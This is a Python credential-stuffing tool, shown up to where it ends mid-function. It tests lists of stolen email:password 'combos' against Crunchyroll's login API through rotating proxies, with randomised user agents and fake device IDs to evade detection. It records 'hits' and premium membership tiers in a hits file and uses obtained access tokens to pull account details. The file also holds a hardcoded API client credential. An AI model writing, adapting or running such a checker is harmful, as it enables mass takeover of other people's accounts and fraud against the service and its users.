import requests
import time
import os
import urllib.parse
import uuid
import threading
import concurrent.futures
import re
from datetime import datetime, timedelta
from requests.exceptions import ProxyError, ConnectionError, RequestException, Timeout, ReadTimeout
import shutil
import json
import logging
import random
from collections import deque

logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
logger = logging.getLogger(__name__)

file_handler = logging.FileHandler('logs.txt', encoding='utf-8')
file_handler.setLevel(logging.DEBUG) 
file_handler.setFormatter(logging.Formatter('%(asctime)s - %(levelname)s - %(message)s'))
logger.addHandler(file_handler)

counters = {}

combo_requeue = deque()

MAX_TOTAL_RETRIES_FOR_COMBO = 100

MAX_INTERNAL_API_RETRIES = 50

country_translations = {
    "AF": "Afghanistan \U0001F1E6\U0001F1EB",
    "AX": "Aland Islands \U0001F1E6\U0001F1FD",
    "AL": "Albania \U0001F1E6\U0001F1F1",
    "DZ": "Algeria \U0001F1E9\U0001F1FF",
    "AS": "American Samoa \U0001F1E6\U0001F1F8",
    "AD": "Andorra \U0001F1E6\U0001F1E9",
    "AO": "Angola \U0001F1E6\U0001F1F4",
    "AI": "Anguilla \U0001F1E6\U0001F1EE",
    "AQ": "Antarctica \U0001F1E6\U0001F1F6",
    "AG": "Antigua and Barbuda \U0001F1E6\U0001F1EC",
    "AR": "Argentina \U0001F1E6\U0001F1F7",
    "AM": "Armenia \U0001F1E6\U0001F1F2",
    "AW": "Aruba \U0001F1E6\U0001F1FC",
    "AU": "Australia \U0001F1E6\U0001F1FA",
    "AT": "Austria \U0001F1E6\U0001F1F9",
    "AZ": "Azerbaijan \U0001F1E6\U0001F1FF",
    "BS": "Bahamas \U0001F1E7\U0001F1F8",
    "BH": "Bahrain \U0001F1E7\U0001F1ED",
    "BD": "Bangladesh \U0001F1E7\U0001F1E9",
    "BB": "Barbados \U0001F1E7\U0001F1E7",
    "BY": "Belarus \U0001F1E7\U0001F1FE",
    "BE": "Belgium \U0001F1E7\U0001F1EA",
    "BZ": "Belize \U0001F1E7\U0001F1FF",
    "BJ": "Benin \U0001F1E7\U0001F1EF",
    "BM": "Bermuda \U0001F1E7\U0001F1F2",
    "BT": "Bhutan \U0001F1E7\U0001F1F9",
    "BO": "Bolivia, Plurinational State of \U0001F1E7\U0001F1F4",
    "BQ": "Bonaire, Sint Eustatius and Saba \U0001F1E7\U0001F1F6",
    "BA": "Bosnia and Herzegovina \U0001F1E7\U0001F1E6",
    "BW": "Botswana \U0001F1E7\U0001F1FC",
    "BV": "Bouvet Island \U0001F1E7\U0001F1FB",
    "BR": "Brazil \U0001F1E7\U0001F1F7",
    "IO": "British Indian Ocean Territory \U0001F1EE\U0001F1F4",
    "BN": "Brunei Darussalam \U0001F1E7\U0001F1F3",
    "BG": "Bulgaria \U0001F1E7\U0001F1EC",
    "BF": "Burkina Faso \U0001F1E7\U0001F1EB",
    "BI": "Burundi \U0001F1E7\U0001F1EE",
    "KH": "Cambodia \U0001F1F0\U0001F1ED",
    "CM": "Cameroon \U0001F1E8\U0001F1F2",
    "CV": "Cape Verde \U0001F1E8\U0001F1FB",
    "KY": "Cayman Islands \U0001F1F0\U0001F1FE",
    "CF": "Central African Republic \U0001F1E8\U0001F1EB",
    "TD": "Chad \U0001F1F9\U0001F1E9",
    "CL": "Chile \U0001F1E8\U0001F1F1",
    "CN": "China \U0001F1E8\U0001F1F3",
    "CX": "Christmas Island \U0001F1E8\U0001F1FD",
    "CC": "Cocos (Keeling) Islands \U0001F1E8\U0001F1E8",
    "CO": "Colombia \U0001F1E8\U0001F1F4",
    "KM": "Comoros \U0001F1F0\U0001F1F2",
    "CG": "Congo \U0001F1E8\U0001F1EC",
    "CD": "Congo, the Democratic Republic of the \U0001F1E8\U0001F1E9",
    "CK": "Cook Islands \U0001F1E8\U0001F1F0",
    "CR": "Costa Rica \U0001F1E8\U0001F1F7",
    "CI": "Côte d'Ivoire \U0001F1E8\U0001F1EE",
    "HR": "Croatia \U0001F1ED\U0001F1F7",
    "CA": "Canada \U0001F1E8\U0001F1E6",
    "CU": "Cuba \U0001F1E8\U0001F1FA",
    "CW": "Curaçao \U0001F1E8\U0001F1FC",
    "CY": "Cyprus \U0001F1E8\U0001F1FE",
    "CZ": "Czech Republic \U0001F1E8\U0001F1FF",
    "DK": "Denmark \U0001F1E9\U0001F1F0",
    "DJ": "Djibouti \U0001F1E9\U0001F1EF",
    "DM": "Dominica \U0001F1E9\U0001F1F2",
    "DO": "Dominican Republic \U0001F1E9\U0001F1F4",
    "EC": "Ecuador \U0001F1EA\U0001F1E8",
    "EG": "Egypt \U0001F1EA\U0001F1EC",
    "SV": "El Salvador \U0001F1F8\U0001F1FB",
    "GQ": "Equatorial Guinea \U0001F1EC\U0001F1F6",
    "ER": "Eritrea \U0001F1EA\U0001F1F7",
    "EE": "Estonia \U0001F1EA\U0001F1EA",
    "ET": "Ethiopia \U0001F1EA\U0001F1F9",
    "FK": "Falkland Islands (Malvinas) \U0001F1EB\U0001F1F0",
    "FO": "Faroe Islands \U0001F1EB\U0001F1F4",
    "FJ": "Fiji \U0001F1EB\U0001F1EF",
    "FI": "Finland \U0001F1EB\U0001F1EE",
    "FR": "France \U0001F1EB\U0001F1F7",
    "GF": "French Guiana \U0001F1EC\U0001F1EB",
    "PF": "French Polynesia \U0001F1F5\U0001F1EB",
    "TF": "French Southern Territories \U0001F1F9\U0001F1EB",
    "GA": "Gabon \U0001F1EC\U0001F1E6",
    "GM": "Gambia \U0001F1EC\U0001F1F2",
    "GE": "Georgia \U0001F1EC\U0001F1EA",
    "DE": "Germany \U0001F1E9\U0001F1EA",
    "GH": "Ghana \U0001F1EC\U0001F1ED",
    "GI": "Gibraltar \U0001F1EC\U0001F1EE",
    "GR": "Greece \U0001F1EC\U0001F1F7",
    "GL": "Greenland \U0001F1EC\U0001F1F1",
    "GD": "Grenada \U0001F1EC\U0001F1E9",
    "GP": "Guadeloupe \U0001F1EC\U0001F1F5",
    "GU": "Guam \U0001F1EC\U0001F1FA",
    "GT": "Guatemala \U0001F1EC\U0001F1F9",
    "GG": "Guernsey \U0001F1EC\U0001F1EC",
    "GN": "Guinea \U0001F1EC\U0001F1F3",
    "GW": "Guinea-Bissau \U0001F1EC\U0001F1FC",
    "GY": "Guyana \U0001F1EC\U0001F1FE",
    "HT": "Haiti \U0001F1ED\U0001F1F9",
    "HM": "Heard Island and McDonald Islands \U0001F1ED\U0001F1F2",
    "VA": "Holy See (Vatican City State) \U0001F1FB\U0001F1E6",
    "HN": "Honduras \U0001F1ED\U0001F1F3",
    "HK": "Hong Kong \U0001F1ED\U0001F1F0",
    "HU": "Hungary \U0001F1ED\U0001F1FA",
    "IS": "Iceland \U0001F1EE\U0001F1F8",
    "IN": "India \U0001F1EE\U0001F1F3",
    "ID": "Indonesia \U0001F1EE\U0001F1E9",
    "IR": "Iran, Islamic Republic of \U0001F1EE\U0001F1F7",
    "IQ": "Iraq \U0001F1EE\U0001F1F6",
    "IE": "Ireland \U0001F1EE\U0001F1EA",
    "IM": "Isle of Man \U0001F1EE\U0001F1F2",
    "IL": "Israel \U0001F1EE\U0001F1F1",
    "IT": "Italy \U0001F1EE\U0001F1F9",
    "JM": "Jamaica \U0001F1EF\U0001F1F2",
    "JP": "Japan \U0001F1EF\U0001F1F5",
    "JE": "Jersey \U0001F1EF\U0001F1EA",
    "JO": "Jordan \U0001F1EF\U0001F1F4",
    "KZ": "Kazakhstan \U0001F1F0\U0001F1FF",
    "KE": "Kenya \U0001F1F0\U0001F1EA",
    "KI": "Kiribati \U0001F1F0\U0001F1EE",
    "KP": "Korea, Democratic People's Republic of \U0001F1F0\U0001F1F5",
    "KR": "Korea, Republic of \U0001F1F0\U0001F1F7",
    "KW": "Kuwait \U0001F1F0\U0001F1FC",
    "KG": "Kyrgyzstan \U0001F1F0\U0001F1EC",
    "LA": "Lao People's Democratic Republic \U0001F1F1\U0001F1E6",
    "LV": "Latvia \U0001F1F1\U0001F1FB",
    "LB": "Lebanon \U0001F1F1\U0001F1E7",
    "LS": "Lesotho \U0001F1F1\U0001F1F8",
    "LR": "Liberia \U0001F1F1\U0001F1F7",
    "LY": "Libya \U0001F1F1\U0001F1FE",
    "LI": "Liechtenstein \U0001F1F1\U0001F1EE",
    "LT": "Lithuania \U0001F1F1\U0001F1F9",
    "LU": "Luxembourg \U0001F1F1\U0001F1FA",
    "MO": "Macao \U0001F1F2\U0001F1F4",
    "MK": "Macedonia, the Former Yugoslav Republic of \U0001F1F2\U0001F1F0",
    "MG": "Madagascar \U0001F1F2\U0001F1EC",
    "MW": "Malawi \U0001F1F2\U0001F1FC",
    "MY": "Malaysia \U0001F1F2\U0001F1FE",
    "MV": "Maldives \U0001F1F2\U0001F1FB",
    "ML": "Mali \U0001F1F2\U0001F1F1",
    "MT": "Malta \U0001F1F2\U0001F1F9",
    "MH": "Marshall Islands \U0001F1F2\U0001F1ED",
    "MQ": "Martinique \U0001F1F2\U0001F1F6",
    "MR": "Mauritania \U0001F1F2\U0001F1F7",
    "MU": "Mauritius \U0001F1F2\U0001F1FA",
    "YT": "Mayotte \U0001F1FE\U0001F1F9",
    "MX": "Mexico \U0001F1F2\U0001F1FD",
    "FM": "Micronesia, Federated States of \U0001F1EB\U0001F1F2",
    "MD": "Moldova, Republic of \U0001F1F2\U0001F1E9",
    "MC": "Monaco \U0001F1F2\U0001F1E8",
    "MN": "Mongolia \U0001F1F2\U0001F1F3",
    "ME": "Montenegro \U0001F1F2\U0001F1EA",
    "MS": "Montserrat \U0001F1F2\U0001F1F8",
    "MA": "Morocco \U0001F1F2\U0001F1E6",
    "MZ": "Mozambique \U0001F1F2\U0001F1FF",
    "MM": "Myanmar \U0001F1F2\U0001F1F2",
    "NA": "Namibia \U0001F1F3\U0001F1E6",
    "NR": "Nauru \U0001F1F3\U0001F1F7",
    "NP": "Nepal \U0001F1F3\U0001F1F5",
    "NL": "Netherlands \U0001F1F3\U0001F1F1",
    "NC": "New Caledonia \U0001F1F3\U0001F1E8",
    "NZ": "New Zealand \U0001F1F3\U0001F1FF",
    "NI": "Nicaragua \U0001F1F3\U0001F1EE",
    "NE": "Niger \U0001F1F3\U0001F1EA",
    "NG": "Nigeria \U0001F1F3\U0001F1EC",
    "NU": "Niue \U0001F1F3\U0001F1FA",
    "NF": "Norfolk Island \U0001F1F3\U0001F1EB",
    "MP": "Northern Mariana Islands \U0001F1F2\U0001F1F5",
    "NO": "Norway \U0001F1F3\U0001F1F4",
    "OM": "Oman \U0001F1F4\U0001F1F2",
    "PK": "Pakistan \U0001F1F5\U0001F1F0",
    "PW": "Palau \U0001F1F5\U0001F1FC",
    "PS": "Palestine, State of \U0001F1F5\U0001F1F8",
    "PA": "Panama \U0001F1F5\U0001F1E6",
    "PG": "Papua New Guinea \U0001F1F5\U0001F1EC",
    "PY": "Paraguay \U0001F1F5\U0001F1FE",
    "PE": "Peru \U0001F1F5\U0001F1EA",
    "PH": "Philippines \U0001F1F5\U0001F1ED",
    "PN": "Pitcairn \U0001F1F5\U0001F1F3",
    "PL": "Poland \U0001F1F5\U0001F1F1",
    "PT": "Portugal \U0001F1F5\U0001F1F9",
    "PR": "Puerto Rico \U0001F1F5\U0001F1F7",
    "QA": "Qatar \U0001F1F6\U0001F1E6",
    "RE": "Réunion \U0001F1F7\U0001F1EA",
    "RO": "Romania \U0001F1F7\U0001F1F4",
    "RU": "Russian Federation \U0001F1F7\U0001F1FA",
    "RW": "Rwanda \U0001F1F7\U0001F1FC",
    "BL": "Saint Barthélemy \U0001F1E7\U0001F1F1",
    "SH": "Saint Helena, Ascension and Tristan da Cunha \U0001F1F8\U0001F1ED",
    "KN": "Saint Kitts and Nevis \U0001F1F0\U0001F1F3",
    "LC": "Saint Lucia \U0001F1F1\U0001F1E8",
    "MF": "Saint Martin (French part) \U0001F1EB\U0001F1F2",
    "PM": "Saint Pierre and Miquelon \U0001F1F5\U0001F1F2",
    "VC": "Saint Vincent and the Grenadines \U0001F1FB\U0001F1E8",
    "WS": "Samoa \U0001F1FC\U0001F1F8",
    "SM": "San Marino \U0001F1F8\U0001F1F2",
    "ST": "Sao Tome and Principe \U0001F1F8\U0001F1F9",
    "SA": "Saudi Arabia \U0001F1F8\U0001F1E6",
    "SN": "Senegal \U0001F1F8\U0001F1F3",
    "RS": "Serbia \U0001F1F7\U0001F1F8",
    "SC": "Seychelles \U0001F1F8\U0001F1E8",
    "SL": "Sierra Leone \U0001F1F8\U0001F1F1",
    "SG": "Singapore \U0001F1F8\U0001F1EC",
    "SX": "Sint Maarten (Dutch part) \U0001F1F8\U0001F1FD",
    "SK": "Slovakia \U0001F1F8\U0001F1F0",
    "SI": "Slovenia \U0001F1F8\U0001F1EE",
    "SB": "Solomon Islands \U0001F1F8\U0001F1E7",
    "SO": "Somalia \U0001F1F8\U0001F1F4",
    "ZA": "South Africa \U0001F1FF\U0001F1E6",
    "GS": "South Georgia and the South Sandwich Islands \U0001F1EC\U0001F1F8",
    "SS": "South Sudan \U0001F1F8\U0001F1F8",
    "ES": "Spain \U0001F1EA\U0001F1F8",
    "LK": "Sri Lanka \U0001F1F1\U0001F1F0",
    "SD": "Sudan \U0001F1F8\U0001F1E9",
    "SR": "Suriname \U0001F1F8\U0001F1F7",
    "SJ": "Svalbard and Jan Mayen \U0001F1F8\U0001F1EF",
    "SZ": "Swaziland \U0001F1F8\U0001F1FF",
    "SE": "Sweden \U0001F1F8\U0001F1EA",
    "CH": "Switzerland \U0001F1E8\U0001F1ED",
    "SY": "Syrian Arab Republic \U0001F1F8\U0001F1FE",
    "TW": "Taiwan, Province of China \U0001F1F9\U0001F1FC",
    "TJ": "Tajikistan \U0001F1F9\U0001F1EF",
    "TZ": "Tanzania, United Republic of \U0001F1F9\U0001F1FF",
    "TH": "Thailand \U0001F1F9\U0001F1ED",
    "TL": "Timor-Leste \U0001F1F9\U0001F1F1",
    "TG": "Togo \U0001F1F9\U0001F1EC",
    "TK": "Tokelau \U0001F1F9\U0001F1F0",
    "TO": "Tonga \U0001F1F9\U0001F1F4",
    "TT": "Trinidad and Tobago \U0001F1F9\U0001F1F9",
    "TN": "Tunisia \U0001F1F9\U0001F1F3",
    "TR": "Turkey \U0001F1F9\U0001F1F7",
    "TM": "Turkmenistan \U0001F1F9\U0001F1F2",
    "TC": "Turks and Caicos Islands \U0001F1F9\U0001F1E8",
    "TV": "Tuvalu \U0001F1F9\U0001F1FB",
    "UG": "Uganda \U0001F1FA\U0001F1EC",
    "UA": "Ukraine \U0001F1FA\U0001F1E6",
    "AE": "United Arab Emirates \U0001F1E6\U0001F1EA",
    "GB": "United Kingdom \U0001F1EC\U0001F1E7",
    "US": "United States \U0001F1FA\U0001F1F8",
    "UM": "United States Minor Outlying Islands \U0001F1FA\U0001F1F2",
    "UY": "Uruguay \U0001F1FA\U0001F1FE",
    "UZ": "Uzbekistan \U0001F1FA\U0001F1FF",
    "VU": "Vanuatu \U0001F1FB\U0001F1FA",
    "VE": "Venezuela, Bolivarian Republic of \U0001F1FB\U0001F1EA",
    "VN": "Viet Nam \U0001F1FB\U0001F1F3",
    "VG": "Virgin Islands, British \U0001F1FB\U0001F1EC",
    "VI": "Virgin Islands, U.S. \U0001F1FB\U0001F1EE",
    "WF": "Wallis and Futuna \U0001F1FC\U0001F1EB",
    "EH": "Western Sahara \U0001F1EA\U0001F1ED",
    "YE": "Yemen \U0001F1FE\U0001F1EA",
    "ZM": "Zambia \U0001F1FF\U0001F1F2",
    "ZW": "Zimbabwe \U0001F1FF\U0001F1FC"
}

def generate_random_user_agent():
    user_agents = [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36",
        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36",
        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/108.0.1462.54",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/107.0.1418.62",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Firefox/108.0",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Firefox/107.0",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Safari/605.1.15",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.0 Safari/605.1.15",
        "Mozilla/5.0 (Linux; Android 10; SM-G973F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.5359.128 Mobile Safari/537.36",
        "Mozilla/5.0 (Linux; Android 11; Pixel 5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.5359.128 Mobile Safari/537.36",
        "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Mobile/15E148 Safari/604.1",
        "Mozilla/5.0 (iPad; CPU OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Mobile/15E148 Safari/604.1"
    ]
    return random.choice(user_agents)

def generate_random_device_info():
    devices = [
        ("SM-S918B", "samsung SM-S918B"),
        ("Pixel 8 Pro", "Google Pixel 8 Pro"),
        ("iPhone 15", "Apple iPhone 15"),
        ("iPad Pro", "Apple iPad Pro"),
        ("SM-G998U", "samsung SM-G998U"),
        ("OnePlus 11", "OnePlus 11"),
        ("Xiaomi 13", "Xiaomi 13"),
        ("Galaxy Tab S8", "samsung Galaxy Tab S8")
    ]
    device_id = str(uuid.uuid4())
    device_name, device_type = random.choice(devices)
    return device_id, device_name, device_type

def start_checker(session_id, combo_file, proxy_file, threads, socketio, proxy_type):
    logger.info(f"Starting checker for session {session_id} with {threads} threads, proxy type: {proxy_type}")

    counters[session_id] = {
        'checked': 0,
        'invalid': 0,
        'hits': 0,
        'custom': 0,
        'total_mega_fan': 0,
        'total_fan_member': 0,
        'total_ultimate_mega': 0,
        'errors': 0,
        'retries': 0,
        'is_running': True,
        'is_paused': False,
        'completed': False,
        'start_time': datetime.now(),
        'end_time': None,
        'total_lines': 0
    }

    try:
        with open(combo_file, 'r', encoding='utf-8') as f:
            combo_lines = f.read().splitlines()
        logger.info(f"Read combo file with UTF-8 encoding")
    except UnicodeDecodeError:
        with open(combo_file, 'r', encoding='latin-1') as f:
            combo_lines = f.read().splitlines()
        logger.info(f"Read combo file with latin-1 encoding")

    try:
        with open(proxy_file, 'r', encoding='utf-8') as f:
            proxy_lines = f.read().splitlines()
        logger.info(f"Read proxy file with UTF-8 encoding")
    except UnicodeDecodeError:
        with open(proxy_file, 'r', encoding='latin-1') as f:
            proxy_lines = f.read().splitlines()
        logger.info(f"Read proxy file with latin-1 encoding")

    combo_lines = [line for line in combo_lines if line.strip() and ':' in line]
    proxy_lines = [line for line in proxy_lines if line.strip()]

    if not proxy_lines:
        logger.error("No valid proxies found. Checker cannot start.")
        socketio.emit('error', {'message': '❌ No valid proxies found! Please upload a proxy file.'}, room=session_id)
        counters[session_id]['is_running'] = False
        return

    logger.info(f"Loaded {len(combo_lines)} combo lines and {len(proxy_lines)} proxy lines")

    counters[session_id]['total_lines'] = len(combo_lines)

    session_dir = f"session_{session_id}"
    hit_file_path = f"{session_dir}/hits.txt"
    custom_file_path = f"{session_dir}/custom.txt"

    open(hit_file_path, 'w').close()
    open(custom_file_path, 'w').close()

    processing_queue = deque([(combo, 0) for combo in combo_lines])

    def process_combo_wrapper():
        while is_session_active(session_id) and (processing_queue or combo_requeue):
            while counters[session_id]['is_paused'] and counters[session_id]['is_running']:
                time.sleep(1)

            if not counters[session_id]['is_running']:
                logger.debug(f"Checker stopped, exiting process_combo_wrapper.")
                break

            combo_data = None
            try:
                if combo_requeue:
                    combo_data = combo_requeue.popleft()
                    logger.debug(f"Picked re-queued combo: {combo_data[0].split(':')[0]} (Retry: {combo_data[1]})")
                elif processing_queue:
                    combo_data = processing_queue.popleft()
                    logger.debug(f"Picked new combo: {combo_data[0].split(':')[0]} (Retry: {combo_data[1]})")
                else:
                    time.sleep(0.1)
                    continue

                combo, current_combo_retries = combo_data

                if ':' not in combo:
                    counters[session_id]['invalid'] += 1
                    counters[session_id]['checked'] += 1
                    socketio.emit('stats_update', generate_stats_text(session_id), room=session_id)
                    logger.warning(f"Invalid combo format: {combo}")
                    continue

                result = check_account(session_id, combo, proxy_lines, socketio, current_combo_retries, proxy_type)

                if result == "RETRY":
                    if current_combo_retries < MAX_TOTAL_RETRIES_FOR_COMBO - 1:
                        combo_requeue.append((combo, current_combo_retries + 1))
                        logger.info(f"Re-queueing combo {combo.split(':')[0]} (Attempt {current_combo_retries + 1}/{MAX_TOTAL_RETRIES_FOR_COMBO})")
                        counters[session_id]['retries'] += 1
                    else:
                        logger.warning(f"Combo {combo.split(':')[0]} exhausted max retries ({MAX_TOTAL_RETRIES_FOR_COMBO}). Dropping from queue.")
                        counters[session_id]['checked'] += 1
                        logger.info(f"Combo {combo.split(':')[0]} dropped after {MAX_TOTAL_RETRIES_FOR_COMBO} attempts.")
                elif result == "CHECKED":
                    counters[session_id]['checked'] += 1

                socketio.emit('stats_update', generate_stats_text(session_id), room=session_id)

            except IndexError:
                time.sleep(0.1)
            except Exception as e:
                logger.error(f"Unhandled error in process_combo_wrapper for combo {combo_data[0].split(':')[0] if combo_data else 'N/A'}: {e}", exc_info=True)
                if is_session_active(session_id):
                    counters[session_id]['errors'] += 1
                socketio.emit('stats_update', generate_stats_text(session_id), room=session_id)

    try:
        with concurrent.futures.ThreadPoolExecutor(max_workers=threads) as executor:
            futures = [executor.submit(process_combo_wrapper) for _ in range(threads)]

            concurrent.futures.wait(futures)

    except Exception as e:
        logger.critical(f"Critical error in ThreadPoolExecutor: {e}", exc_info=True)
    finally:
        if session_id in counters:
            if counters[session_id]['is_running']:
                counters[session_id]['completed'] = True
                counters[session_id]['end_time'] = datetime.now()
                counters[session_id]['is_running'] = False
                logger.info(f"Checker completed for session {session_id}")
                socketio.emit('checker_completed', {'message': '✅ Checking completed!'}, room=session_id)
            else:
                logger.info(f"Checker for session {session_id} was stopped externally.")


def url_encode(text):
    return urllib.parse.quote(text)

def generate_guid():
    return str(uuid.uuid4())

def is_session_active(session_id):
    return session_id in counters and counters[session_id]['is_running']

def format_proxy(proxy, proxy_type):
    if not proxy:
        return None

    if proxy_type not in ['http', 'socks4', 'socks5']:
        logger.warning(f"Invalid proxy_type '{proxy_type}' provided. Defaulting to 'http'.")
        proxy_type = 'http'

    if "://" in proxy:
        current_scheme = proxy.split("://")[0]
        if current_scheme.lower() != proxy_type.lower():
            logger.warning(f"Proxy '{proxy}' has scheme '{current_scheme}' but selected type is '{proxy_type}'. Forcing selected type.")
            return f"{proxy_type}://{proxy.split('://', 1)[1]}"
        return proxy

    parts = proxy.split(':')
    if len(parts) == 2:
        ip, port = parts
        return f"{proxy_type}://{ip}:{port}"
    elif len(parts) == 4:
        ip, port, user, password = parts
        return f"{proxy_type}://{user}:{password}@{ip}:{port}"
    else:
        logger.warning(f"Unrecognized proxy format: {proxy}. Attempting to use as {proxy_type}://ip:port.")
        return f"{proxy_type}://{proxy}"

def check_account(session_id, combo, proxy_lines, socketio, current_combo_retries, proxy_type):
    email, password = combo.split(':', 1)

    proxies = None
    if proxy_lines:
        proxy = random.choice(proxy_lines)
        formatted_proxy = format_proxy(proxy, proxy_type)
        logger.debug(f"Using proxy: {formatted_proxy} (Type: {proxy_type}) for {email} (Combo Attempt: {current_combo_retries + 1})")

        if formatted_proxy:
            proxies = {
                "http": formatted_proxy,
                "https": formatted_proxy
            }
    else:
        logger.warning("No proxy available for checking. This should not happen if start_checker checks for it.")
        return False

    auth_retry_count = 0
    access_token = None
    last_auth_response_text = "N/A"
    auth_failure_reason = "Unknown"

    while auth_retry_count < MAX_INTERNAL_API_RETRIES:
        if not is_session_active(session_id) or counters[session_id]['is_paused']:
            return False

        try:
            device_id, device_name, device_type = generate_random_device_info()
            user_agent = generate_random_user_agent()

            url = "https://beta-api.crunchyroll.com/auth/v1/token"
            payload = f"username={url_encode(email)}&password={url_encode(password)}&grant_type=password&scope=offline_access&device_id={device_id}&device_name={urllib.parse.quote(device_name)}&device_type={urllib.parse.quote(device_type)}"
            headers = {
                "host": "beta-api.crunchyroll.com",
                "authorization": "Basic dGRnYmNwaHh4M3o5cmI3YTE4Mm06VFlGUV9lSEhiRkh0c0pOYzlFamwzWVBzMDN1VUJESFY=",
                "x-datadog-sampling-priority": "0",
                "etp-anonymous-id": str(uuid.uuid4()),
                "content-type": "application/x-www-form-urlencoded",
                "content-length": str(len(payload)),
                "accept-encoding": "gzip",
                "user-agent": user_agent
            }

            logger.debug(f"Auth request for {email} (Internal Retry: {auth_retry_count + 1}/{MAX_INTERNAL_API_RETRIES})")
            session_req = requests.Session()
            response = session_req.post(url, headers=headers, data=payload, proxies=proxies, timeout=15)
            last_auth_response_text = response.text[:500]

            logger.debug(f"Auth response status for {email}: {response.status_code}")

            if response.status_code == 200:
                if "\"access_token\":\"" in response.text:
                    access_token_match = re.search(r'"access_token":"(.*?)"', response.text)
                    access_token = access_token_match.group(1) if access_token_match else None
                    if access_token:
                        break
                    else:
                        auth_failure_reason = "200 OK but no access token"
                        logger.warning(f"Auth failed for {email}: {auth_failure_reason}. Response: {last_auth_response_text}")
                else:
                    auth_failure_reason = "200 OK but unexpected content"
                    logger.warning(f"Auth failed for {email}: {auth_failure_reason}. Response: {last_auth_response_text}")
            elif response.status_code == 401:
                if "auth.obtain_access_token.invalid_credentials" in response.text or "error\":\"invalid_request" in response.text or response.status_code == 401:
                    logger.debug(f"Invalid credentials for {email}")
                    counters[session_id]['invalid'] += 1
                    return "CHECKED"
            elif response.status_code in [403, 406, 429, 500, 502, 503, 504]:
                auth_failure_reason = f"Server/Proxy error: {response.status_code}"
                logger.warning(f"Auth failed for {email}: {auth_failure_reason}. Retrying internally. Response: {last_auth_response_text}")
            else:
                auth_failure_reason = f"Unexpected status code: {response.status_code}"
                logger.warning(f"Auth failed for {email}: {auth_failure_reason}. Retrying internally. Response: {last_auth_response_text}")

            auth_retry_count += 1
            counters[session_id]['retries'] += 1
            time.sleep(2 + auth_retry_count)

        except (ProxyError, ConnectionError, RequestException, Timeout, ReadTimeout) as e:
            auth_failure_reason = f"Network error: {type(e).__name__} - {str(e)}"
            logger.warning(f"Auth failed for {email}: {auth_failure_reason}. Retrying internally.")
            counters[session_id]['retries'] += 1
            auth_retry_count += 1
            time.sleep(3 + auth_retry_count)
        except Exception as e:
            auth_failure_reason = f"Unexpected exception: {str(e)}"
            logger.error(f"Auth failed for {email}: {auth_failure_reason}", exc_info=True)
            counters[session_id]['retries'] += 1
            auth_retry_count += 1
            time.sleep(1)

    if not access_token:
        logger.warning(f"Auth failed for {email} after {MAX_INTERNAL_API_RETRIES} internal retries. Re-queueing combo.")
        return "RETRY"

    email_verified = "NO❌"
    external_id = None
    details_retry_count = 0
    last_details_response_text = "N/A"
    details_failure_reason = "Unknown"

    while details_retry_count < MAX_INTERNAL_API_RETRIES:
        if not is_session_active(session_id) or counters[session_id]['is_paused']:
            return False

        try:
            details_url = "https://beta-api.crunchyroll.com/accounts/v1/me"
            details_headers = {
                "User-Agent": generate_random_user_agent(),
                "Pragma": "no-cache",
                "Accept": "*/*",
                "host": "beta-api.crunchyroll.com",
                "authorization": f"Bearer {access_token}",
                "x-datadog-sampling-priority": "0",
                "etp-anonymous-id": str(uuid.uuid4()),
                "accept-encoding": "gzip",
            }
            logger.debug(f"Details request for {email} (Internal Retry: {details_retry_count + 1}/{MAX_INTERNAL_API_RETRIES})")
            details_response = session_req.get(details_url, headers=details_headers, proxies=proxies, timeout=15)
            last_details_response_text = details_response.text[:500]

            if details_response.status_code == 200:
                details_data = details_response.text
                email_verified_match = re.search(r'"email_verified":(true|false)', details_data)
                email_verified = "YES✅" if email_verified_match and email_verified_match.group(1) == "true" else "NO❌"
                external_id_match = re.search(r'"external_id":"(.*?)"', details_data)
                external_id = external_id_match.group(1) if external_id_match else None

                if external_id:
                    break
                else:
                    details_failure_reason = "No external_id found"
                    logger.warning(f"Details failed for {email}: {details_failure_reason}. Response: {last_details_response_text}")
            elif details_response.status_code in [403, 406, 429, 500, 502, 503, 504]:
                details_failure_reason = f"Server/Proxy error: {details_response.status_code}"
                logger.warning(f"Details failed for {email}: {details_failure_reason}. Retrying internally. Response: {last_details_response_text}")
            else:
                details_failure_reason = f"Unexpected status code: {details_response.status_code}"
                logger.warning(f"Details failed for {email}: {details_failure_reason}. Retrying internally. Response: {last_details_response_text}")

            details_retry_count += 1
            counters[session_id]['retries'] += 1
            time.sleep(2 + details_retry_count)

        except (ProxyError, ConnectionError, RequestException, Timeout, ReadTimeout) as e:
            details_failure_reason = f"Network error: {type(e).__name__} - {str(e)}"
